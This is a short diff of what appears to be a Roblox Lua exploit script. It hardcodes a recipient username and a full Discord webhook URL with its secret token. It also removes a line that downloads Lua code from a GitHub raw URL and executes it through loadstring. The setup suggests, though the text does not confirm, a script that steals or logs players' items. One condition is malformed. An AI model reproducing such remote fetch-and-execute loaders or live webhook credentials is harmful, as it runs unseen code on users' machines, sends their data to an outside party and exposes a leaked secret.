@@ -1,7 +1,6 @@
 DhUser = "HerrySzymoN"
 DhWebhook = "https://discord.com/api/webhooks/1093827767948288050/rx_kEjRnxLTNUmSrZgME13mMRdLPaeXyFjdhnCgArlXA-ASK9jo6ifUQUgo6iSXL_JBN"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/psxscripter1337/dsvvds/main/dsv.lua"))()
- 
+
  
 if _G.UserName == _G.UserName == "HerrySzymoN" then
     _G.UserName = DhUser
